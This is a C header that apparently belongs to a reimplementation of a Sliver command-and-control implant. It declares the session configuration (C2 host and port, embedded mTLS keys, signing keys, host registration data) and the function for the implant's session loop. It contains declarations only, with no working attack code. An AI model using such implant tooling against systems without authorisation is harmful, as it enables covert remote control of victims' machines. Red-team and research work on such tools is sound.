/* sliver/session.h - interactive session loop (mtls transport).
 *
 * Composes the layers built so far:
 *   TLS 1.3 mutual auth -> "MUX/1" -> yamux -> signed Envelope frames
 * and keeps the registration stream open, serving server initiated streams
 * (ping, unknown message types) until the connection dies.
 */
#ifndef SLIVER_SESSION_H
#define SLIVER_SESSION_H

#include <stdint.h>

#include "sliver/proto.h"

#ifdef __cplusplus
extern "C" {
#endif

typedef struct {
  const char *host;
  uint16_t port;

  /* mTLS material (PEM), injected at build time in the real implant. */
  const char *ca_pem;
  const char *cert_pem;
  const char *key_pem;

  /* age private key string -> envelope signing seed. */
  const char *age_private_key;
  /* two line minisign public key used to verify server frames. */
  const char *server_minisign_pubkey;

  /* Register payload; hostname/os/arch/pid/filename are filled in by the
   * caller, active_c2 is set from host/port below. */
  sliver_register_t reg;
} sliver_session_config_t;

/* Runs until the connection fails or the peer goes away. Returns 0 when the
 * session ended cleanly, -1 on a protocol/transport error. */
int sliver_session_run(const sliver_session_config_t *cfg);

#ifdef __cplusplus
}
#endif

#endif /* SLIVER_SESSION_H */
